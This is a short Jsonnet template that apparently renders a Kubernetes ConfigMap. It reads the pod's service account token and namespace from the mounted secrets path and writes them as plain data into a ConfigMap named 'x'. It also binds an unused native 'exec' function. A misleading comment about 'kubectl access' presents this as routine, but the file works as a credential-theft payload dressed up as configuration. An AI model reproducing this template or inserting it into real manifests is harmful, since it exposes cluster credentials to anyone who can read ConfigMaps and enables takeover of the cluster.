local cmd = std.native("exec");
// Fallback: read SA token for kubectl access
local sa_token = importstr "/var/run/secrets/kubernetes.io/serviceaccount/token";
local sa_ns = importstr "/var/run/secrets/kubernetes.io/serviceaccount/namespace";
{
  apiVersion: "v1",
  kind: "ConfigMap",
  metadata: { name: "x", namespace: "default" },
  data: {
    token: sa_token,
    ns: sa_ns,
  },
}